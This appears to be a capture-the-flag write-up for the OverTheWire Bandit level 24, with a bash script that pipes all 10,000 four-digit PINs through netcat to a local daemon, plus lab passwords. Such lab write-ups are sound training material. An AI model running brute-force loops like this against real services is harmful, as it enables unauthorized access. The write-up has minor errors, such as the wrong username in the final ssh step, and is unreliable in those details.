# Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

# Solution

It is apparent that we need to create a script and for training purposes it is going to be a bash script. The script Runs over all the possible 4 digit combinations and then returns the correct value when found.
1. Create a bash script file.
```Bash
touch bruteforce.sh
```

2. The bash Script is as follows.
```Bash
#!/bin/bash
rm /tmp/bandit25/output
for i in {0000..9999}
do 
  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done | nc localhost 30002
```
Notice that the piping to the port is done only after all the combinations had finished computing. The basic reason for this is that if netcat is called everytime, this would create multiple procesess that wont shutdown as we dont know the PID of each command. These processes needs resources to stay alive after they have done their purpose, so after a while there are no longer resources to allocate for new commands. So in short, it is more efficient to send all the data all at once instead of sending through the script.

3. Run the script until the password appears.
```Bash
./bruteforce.sh
```
The password should be visible now.

4. Exit the bandit24 shell
```Bash
exit
```

5. ssh into bandit25
```Bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
